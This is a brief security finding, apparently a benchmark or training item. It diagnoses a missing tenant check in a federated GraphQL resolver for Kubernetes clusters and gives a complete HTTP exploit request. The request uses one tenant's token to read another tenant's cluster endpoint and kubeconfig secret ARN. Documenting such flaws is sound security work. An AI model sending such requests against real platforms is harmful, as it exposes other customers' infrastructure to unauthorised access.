diagnosis: The federated entity resolver for KubernetesCluster performs a findUnique lookup based exclusively on reference.id supplied in the supergraph query. It fails to verify that the cluster belongs to context.auth.organizationId. An attacker on the multi-tenant platform can resolve arbitrary competitor cluster ARNs and API endpoints by crafting federated _entities requests with predicted or enumerated cluster IDs.
exploit_request:
POST /subgraph/cloud HTTP/1.1
Host: platform.cloud.internal:5050
Content-Type: application/json
Authorization: Bearer <tenant_a_token>

{"query": "query { _entities(representations: [{ __typename: \"KubernetesCluster\", id: \"cls_tenant_b_88194\" }]) { ... on KubernetesCluster { clusterName apiServerEndpoint kubeconfigSecretArn nodeCount } } }"}
